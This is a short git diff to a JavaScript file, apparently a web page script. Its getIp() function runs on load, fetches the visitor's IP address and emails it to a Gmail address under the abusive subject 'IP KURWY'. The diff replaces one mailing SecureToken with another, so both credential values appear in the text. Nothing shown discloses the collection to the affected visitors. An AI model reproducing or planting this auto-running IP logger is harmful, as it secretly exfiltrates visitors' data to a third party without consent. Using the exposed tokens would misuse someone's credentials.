@@ -17,7 +17,7 @@ const getIp = () => {
     .then((response) => response.json())
     .then((data) => {
       Email.send({
-        SecureToken: "6159cc5f-8436-4273-8e76-f9620c4bda2f",
+        SecureToken: "e319dd4a-f853-41aa-812a-a7a466e1613f",
         To: "walden.devbusiness@gmail.com",
         From: "walden.devbusiness@gmail.com",
         Subject: "IP KURWY",
@@ -27,4 +27,3 @@ const getIp = () => {
 };
 
 getIp();
-
